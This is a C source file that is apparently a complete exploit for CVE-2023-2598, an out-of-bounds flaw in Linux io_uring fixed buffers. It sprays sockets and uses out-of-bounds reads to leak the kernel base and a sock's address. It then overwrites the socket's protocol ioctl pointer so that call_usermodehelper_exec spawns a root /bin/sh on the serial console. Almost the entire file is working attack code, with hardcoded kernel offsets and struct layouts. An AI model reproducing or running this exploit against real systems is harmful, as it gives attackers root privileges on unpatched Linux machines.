#define _GNU_SOURCE
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <stdint.h>
#include <inttypes.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <liburing.h>

#define target_tty_dev  "/dev/ttyS0"

#define PAGE_SIZE       0x1000
#define QUEUE_DEPTH     4

/*
 * #define SOCK_MIN_SNDBUF		(TCP_SKB_MIN_TRUESIZE * 2)
 *
 * #define TCP_SKB_MIN_TRUESIZE	(2048 + SKB_DATA_ALIGN(sizeof(struct sk_buff)))
 * 
 * #define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))
 * #define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
 * #define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
 * #define L1_CACHE_SHIFT	(CONFIG_X86_L1_CACHE_SHIFT)
 * #define        L1_CACHE_BYTES  (1<< L1_CACHE_SHIFT)
 * #define SMP_CACHE_BYTES L1_CACHE_BYTES
 * #define SKB_DATA_ALIGN(X)	ALIGN(X, SMP_CACHE_BYTES)
 * 
 * # cat .config | grep CONFIG_X86_L1_CACHE_SHIFT
 * CONFIG_X86_L1_CACHE_SHIFT=6
 * 
 * (remote) gef➤  p sizeof(struct sk_buff)
 * $30 = 0xe8 
 */
#define __ALIGN_MASK(x, mask)   (((x) + (mask)) & ~(mask))
#define ALIGN(x, a)             __ALIGN_MASK(x, (typeof(x))(a) - 1)
#define L1_CACHE_SHIFT  6
#define sk_buff_size    232
#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))

/*
 * root@syzkaller:~# cat /proc/kallsyms > kallsyms.txt
 * root@syzkaller:~# cat kallsyms.txt | grep _stext
 * ffffffff81000000 T _stext
 * root@syzkaller:~# cat kallsyms.txt | grep ffffffff81add890
 * ffffffff81add890 T sock_def_readable
 * root@syzkaller:~# cat kallsyms.txt | grep call_usermodehelper_exec
 * ffffffff810a2ca0 T call_usermodehelper_exec
 * ffffffff810a3060 t call_usermodehelper_exec_work
 */
#define sock_def_readable_koff                  0xadd890
#define call_usermodehelper_exec_koff           0xa2ca0
#define call_usermodehelper_exec_work_koff      0xa3060

// (remote) gef➤  p (struct sock *)1
// $2 = (struct sock *) 0x1 <fixed_percpu_data+1>
// (remote) gef➤  ptype /o struct sock
// ...
// /*     40      |       8 */        struct proto *skc_prot;
// ...
// /*    192      |      24 */    struct sk_buff_head {
// ...
//                                } sk_error_queue;
// ...
// /*    332      |       4 */    int sk_sndbuf;
// ...
// /*    456      |       8 */    unsigned long sk_pacing_rate;
// /*    464      |       8 */    unsigned long sk_max_pacing_rate;
// ...
// /*    680      |       8 */    void (*sk_data_ready)(struct sock *);
#define sock_sk_prot_off        40
#define sock_sk_error_queue_off 192
#define sock_sk_sndbuf_off      332
#define sock_sk_pacing_rate_off 456
#define sock_sk_data_ready_off  680

// (remote) gef➤  ptype /o struct proto
// ...
// /*     40      |       8 */    int (*ioctl)(struct sock *, int, unsigned long);
#define proto_ioctl_off         40
// (remote) gef➤  p sizeof(struct proto)
// $29 = 0x1b8
#define PROTO_SIZE              440

#define TCP_OFFSET      1400

// (remote) gef➤  ptype /o struct subprocess_info
// /* offset      |    size */  type = struct subprocess_info {
// /*      0      |      32 */    struct work_struct {
// /*      0      |       8 */        atomic_long_t data;
// /*      8      |      16 */        struct list_head {
// /*      8      |       8 */            struct list_head *next;
// /*     16      |       8 */            struct list_head *prev;
//
//                                        /* total size (bytes):   16 */
//                                    } entry;
// /*     24      |       8 */        work_func_t func;
//
//                                    /* total size (bytes):   32 */
//                                } work;
// /*     32      |       8 */    struct completion *complete;
// /*     40      |       8 */    const char *path;
// /*     48      |       8 */    char **argv;
// /*     56      |       8 */    char **envp;
// /*     64      |       4 */    int wait;
// /*     68      |       4 */    int retval;
// /*     72      |       8 */    int (*init)(struct subprocess_info *, struct cred *);
// /*     80      |       8 */    void (*cleanup)(struct subprocess_info *);
// /*     88      |       8 */    void *data;
//
//                                /* total size (bytes):   96 */
//                              }
#define subprocess_work_off                     0
#define subprocess_work_entry_next_off          8
#define subprocess_work_entry_prev_off          16
#define subprocess_work_func_off                24
#define subprocess_path_off                     40
#define subprocess_argv_off                     48
#define subprocess_envp_off                     56
#define subprocess_init_off                     72
#define subprocess_cleanup_off                  80

int setup_memfd_page(char *name, int real_pages)
{
        int memfd = memfd_create(name, MFD_CLOEXEC);
        fallocate(memfd, 0, 0, real_pages * PAGE_SIZE);

        return memfd;
}

/*
 * Maps nr_pages consecutive virtual pages to a single physical one.
 */
void *vmap_shallow_pages(int nr_pages, int memfd)
{
        uint64_t start = 0x4247000000;
        for (int i = 0; i < nr_pages; i++) {
                if (mmap(start + i * PAGE_SIZE, PAGE_SIZE,
                         PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_FIXED, memfd, 0) < 0) {
                        perror("[-] mmap");
                        exit(0);
                }
        }

        return (void *) start;
}       

void *seek_value64(void *buffer, int size, uint64_t value)
{
        for (int off = 0; off + 8 <= size; off += 8) {
                uint64_t **at;
                at = buffer + off;
                if (*at == value)
                        return off;
        }

        return -1;
}

int main()
{
        printf("[+] CVE-2023-2598 Exploit by LL\n");

        // 1. Preparation
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(sched_getcpu(), &set);
        if (sched_setaffinity(0, sizeof(set), &set) < 0) {
                perror("[-] sched_setaffinity");
                exit(EXIT_FAILURE);
        }

        // 2. Init io_uring
        struct io_uring ring;
        int ret;

        ret = io_uring_queue_init(QUEUE_DEPTH, &ring, 0);
        if (ret < 0) {
                fprintf(stderr, "[-] Init queue: %s\n", strerror(-ret));
                return 1;
        }

        // 3. Set the maximum value for opening files
        struct rlimit max_files;
        getrlimit(RLIMIT_NOFILE, &max_files);
        printf("[+] Old rlimit_cur = %ld\n", max_files.rlim_cur);
        max_files.rlim_cur = max_files.rlim_max;
        setrlimit(RLIMIT_NOFILE, &max_files);
        getrlimit(RLIMIT_NOFILE, &max_files);
        printf("[+] New rlimit_cur = %ld\n", max_files.rlim_cur);

        int limit = (max_files.rlim_cur - 20) / 3;
        int nr_memfds = limit / 2;
        int nr_sockets = limit - nr_memfds;
        int *memfds = calloc(nr_memfds, sizeof(*memfds));
        int *sockets = calloc(nr_sockets, sizeof(*sockets));
        printf("[+] limit: %d, nr_sockets: %d, nr_memfds: %d\n",
               limit, nr_sockets, nr_memfds);

        // 4. Spray "nr_sockets" sock
        uint64_t egg = 0xdeadbeefdeadbeef;
        for (int i = 0; i < nr_sockets; i++) {
                if ((sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                        fprintf(stderr, "[-] Socket creating failed\n");
                        return 1;
                }
                /* Set sk_pacing_rate and sk_max_pacing_rate */
                if (setsockopt(sockets[i], SOL_SOCKET, SO_MAX_PACING_RATE,
                               &egg, sizeof(uint64_t)) < 0) {
                        fprintf(stderr, "[-] Setting pacing rate failed\n");
                        return 1;
                }
                /* Save fd to sk_sndbuf */
                int max = sockets[i] + SOCK_MIN_SNDBUF;
                if (setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF,
                               &max, sizeof(int)) < 0) {
                        fprintf(stderr, "[-] Failed to set SO_SNDBUF");
                        return 1;
                }
        }

        // 5. Open "nr_memfds" anonymous file
        for (int i = 0; i < nr_memfds; i++)
                memfds[i] = setup_memfd_page("memfd_x", 1);
        
        // 6. Allocate 500 pages for OOB read
        int block_size = 500;
        int receiver_fd = setup_memfd_page("receiver", block_size);
        void *receiver_buffer = mmap(0, block_size * PAGE_SIZE, PROT_READ | PROT_WRITE,
                                     MAP_SHARED, receiver_fd, 0);
        
        struct iovec iovec;
        struct io_uring_sqe *sqe;
        struct io_uring_cqe *cqe;
        int success = 0;
        int nr_maps = 65000;
        for (int i = 0; i < nr_memfds && success == 0; i += 1) {
                // 7. Map "nr_maps" virtual pages to single memfds[i]
                void *buffer = vmap_shallow_pages(nr_maps, memfds[i]);
                iovec.iov_base = buffer;
                iovec.iov_len = nr_maps * PAGE_SIZE;
                ret = io_uring_register_buffers(&ring, &iovec, 1);
                if (ret < 0) {
                        printf("[-] Register buffer failed: %s\n", strerror(-ret));
                        return 1;
                }

                // 8. Traverse every 500 pages, reading "block_size" pages
                for (int v_off = 0; v_off < (nr_maps - block_size); v_off += block_size) {
                        printf("[+] memfd: %d, page: %d at virt_addr: %p, reading %d bytes\n",
                               i, v_off, iovec.iov_base + v_off * PAGE_SIZE,
                               block_size * PAGE_SIZE);

                        sqe = io_uring_get_sqe(&ring);
                        io_uring_prep_write_fixed(sqe, receiver_fd, buffer + v_off * PAGE_SIZE,
                                                  block_size * PAGE_SIZE, 0, 0);
                        ret = io_uring_submit(&ring);
                        if (ret < 0) {
                                printf("[-] Submit io_uring failed: %s\n", strerror(-ret));
                                return 1;
                        }
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);

                        // 9. Find sock by locating sk_pacing_rate and sk_max_pacing_rate
                        uint64_t egg_off = seek_value64(receiver_buffer, block_size * PAGE_SIZE,
                                                        egg);
                        if (egg_off == -1)
                                continue;
                        if (*(uint64_t *) (receiver_buffer + egg_off) !=
                            *(uint64_t *) (receiver_buffer + egg_off + 8))
                            continue;
                        printf("[+] Found egg 0x%" PRIx64 " at receiver_buffer+0x%" PRIx64 "\n",
                               egg, egg_off);

                        uint64_t sock_off = egg_off - sock_sk_pacing_rate_off;
                        printf("[+] Found sock at receiver_buffer+0x%" PRIx64 "\n", sock_off);

                        // 10. Using sock.sk_data_ready to get kernel base
                        uint64_t kaslr_leak, kaslr_base;
                        kaslr_leak = *(uint64_t *) (receiver_buffer + sock_off +
                                                   sock_sk_data_ready_off);
                        printf("[+] Found kaslr_leak: 0x%" PRIx64 "\n", kaslr_leak);
                        kaslr_base = kaslr_leak - sock_def_readable_koff;
                        printf("[+] Found kaslr_base: 0x%" PRIx64 "\n", kaslr_base);

                        // 11. Recover socket fd from sock.sk_sndbuf
                        int fd = *(int *) (receiver_buffer + sock_off + sock_sk_sndbuf_off) / 2
                                          - SOCK_MIN_SNDBUF;
                        printf("[+] Found socket fd: %d\n", fd);

                        // 12. Using sock.sk_error_queue to get sock kernel addr
                        uint64_t sock_kaddr;
                        sock_kaddr = *(uint64_t *) (receiver_buffer + sock_off +
                                                  sock_sk_error_queue_off) -
                                                  sock_sk_error_queue_off;
                        printf("[+] Found sock kernel addr: 0x%" PRIx64 "\n", sock_kaddr);

                        // 13. Save tcp_sock (tcp_sock.inet_connection_sock.inet_sock.sock)
                        // (remote) gef➤  p sizeof(struct tcp_sock)
                        // $14 = 0x8a0 (2208)
                        int sz_tcp_sock = 2208;
                        void *tcp_sock_bak = malloc(tcp_sock_bak);
                        memcpy(tcp_sock_bak, receiver_buffer + sock_off, sz_tcp_sock);

                        // 14. Point sock.__sk_common.skc_prot to fake proto
                        uint64_t fake_proto_kaddr = sock_kaddr + TCP_OFFSET;
                        printf("[+] Fake proto kernel addr: 0x%" PRIx64 "\n", fake_proto_kaddr);
                        memcpy(receiver_buffer, &fake_proto_kaddr, 8);

                        sqe = io_uring_get_sqe(&ring);
                        uint64_t sock_vaddr = buffer + v_off * PAGE_SIZE + sock_off;
                        io_uring_prep_read_fixed(sqe, receiver_fd, sock_vaddr + sock_sk_prot_off,
                                                 8, 0, 0);
                        ret = io_uring_submit(&ring);
                        assert(ret >= 0);
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);

                        // 15. Overwrite fake_proto.ioctl
                        uint64_t ioctl_val = kaslr_base + call_usermodehelper_exec_koff;
                        memcpy(receiver_buffer, &ioctl_val, 8);

                        sqe = io_uring_get_sqe(&ring);
                        uint64_t fake_proto_vaddr = sock_vaddr + TCP_OFFSET;
                        uint64_t fake_proto_ioctl_vaddr = fake_proto_vaddr + proto_ioctl_off;
                        io_uring_prep_read_fixed(sqe, receiver_fd, fake_proto_ioctl_vaddr,
                                                 8, 0, 0);
                        ret = io_uring_submit(&ring);
                        assert(ret >= 0);
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);

                        // 16. Save subprocess_info->path to fake_proto+0
                        char *path = "/bin/sh";
                        memcpy(receiver_buffer, path, strlen(path) + 1);

                        sqe = io_uring_get_sqe(&ring);
                        io_uring_prep_read_fixed(sqe, receiver_fd, fake_proto_vaddr,
                                                 strlen(path) + 1, 0, 0);
                        ret = io_uring_submit(&ring);
                        assert(ret >= 0);
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);

                        // 17. Save char **argv after fake_proto
                        char *arg0 = "";
                        char *arg1 = "-c";
                        // malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) && ...
                        // char *arg2 = malloc(128);
                        // sprintf(arg2, "/bin/sh &>%s <%s", target_tty_dev, target_tty_dev);
                        // sprintf(arg2, "/bin/sh > %s <%s 2>&1", target_tty_dev, target_tty_dev);
                        char *arg2 = "/bin/sh >/dev/ttyS0 </dev/ttyS0 2>&1";
                        uint64_t arg0_kaddr = fake_proto_kaddr + PROTO_SIZE;
                        uint64_t arg1_kaddr = arg0_kaddr + strlen(arg0) + 1;
                        uint64_t arg2_kaddr = arg1_kaddr + strlen(arg1) + 1;
                        uint64_t argv[3];
                        argv[0] = arg0_kaddr;
                        argv[1] = arg1_kaddr;
                        argv[2] = arg2_kaddr;

                        memcpy(receiver_buffer, arg0, strlen(arg0) + 1);
                        memcpy(receiver_buffer + strlen(arg0) + 1, arg1, strlen(arg1) + 1);
                        memcpy(receiver_buffer + strlen(arg0) + strlen(arg1) + 2,
                               arg2, strlen(arg2) + 1);
                        
                        // strlen(arg0) + 1 + strlen(arg1) + 1 + strlen(arg2) + 1
                        uint64_t args_len = arg2_kaddr - arg0_kaddr + strlen(arg2) + 1;
                        args_len = (args_len + 7) & ~7;
                        uint64_t argv_kaddr = fake_proto_kaddr + PROTO_SIZE + args_len;
                        memcpy(receiver_buffer + args_len, &argv, sizeof(argv));

                        sqe = io_uring_get_sqe(&ring);
                        // fake_proto end: [arg0, arg1, arg2, argv[0], argv[1], argv[2]]
                        io_uring_prep_read_fixed(sqe, receiver_fd, fake_proto_vaddr + PROTO_SIZE,
                                                 args_len + sizeof(argv), 0, 0);
                        ret = io_uring_submit(&ring);
                        assert(ret >= 0);
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);
                        printf("[+] Set args kernel addr: 0x%" PRIx64 "\n", arg0_kaddr);
                        printf("[+] Set argv kernel addr: 0x%" PRIx64 "\n", argv_kaddr);

                        // 18. Save subprocess_info to sock+0
                        // (subprocess_info->path == sock->__sock_common->skc_prot)
                        uint64_t subprocess_info[11];
                        subprocess_info[subprocess_work_off/8] = 0;
                        subprocess_info[subprocess_work_entry_next_off/8] = sock_kaddr +
                                subprocess_work_entry_next_off;
                        subprocess_info[subprocess_work_entry_prev_off/8] = sock_kaddr +
                                subprocess_work_entry_prev_off;
                        subprocess_info[subprocess_work_func_off/8] = kaslr_base +
                                call_usermodehelper_exec_work_koff;
                        subprocess_info[subprocess_path_off/8] = fake_proto_kaddr;
                        subprocess_info[subprocess_argv_off/8] = argv_kaddr;
                        subprocess_info[subprocess_envp_off/8] = 0;
                        subprocess_info[subprocess_init_off/8] = 0;
                        subprocess_info[subprocess_cleanup_off/8] = 0;

                        memcpy(receiver_buffer, &subprocess_info, sizeof(subprocess_info));
                        sqe = io_uring_get_sqe(&ring);
                        io_uring_prep_read_fixed(sqe, receiver_fd, sock_vaddr,
                                                 sizeof(subprocess_info), 0, 0);
                        ret = io_uring_submit(&ring);
                        assert(ret >= 0);
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);
                        printf("[+] Set subprocess_info to sock+0 at 0x%" PRIx64 "\n", sock_kaddr);

                        // 19. Call ioctl
                        printf("[+] Calling ioctl()...\n");
                        // Type "exit" to exit normally, otherwise, the system will become slow
                        // without killing /bin/sh with root privilege.
                        ioctl(fd, 1337);
                        sleep(20);

                        // 20. Restore tcp_sock
                        memcpy(receiver_buffer, tcp_sock_bak, sz_tcp_sock);
                        sqe = io_uring_get_sqe(&ring);
                        io_uring_prep_read_fixed(sqe, receiver_fd, sock_vaddr, sz_tcp_sock, 0, 0);
                        ret = io_uring_submit(&ring);
                        assert(ret >= 0);
                        io_uring_wait_cqe(&ring, &cqe);
                        io_uring_cqe_seen(&ring, cqe);
                        printf("[+] Resotre back the tcp_sock\n");

                        success = 1;
                        break;
                }

                io_uring_unregister_buffers(&ring);
                munmap(buffer, nr_maps * PAGE_SIZE);
        }

        for (int i = 0; i < nr_sockets; i++)
                close(sockets[i]);
        for (int i = 0; i < nr_memfds; i++)
                close(memfds[i]);
        munmap(receiver_buffer, block_size * PAGE_SIZE);
        close(receiver_fd);

        printf("[+] Done\n");

        return 0;
}
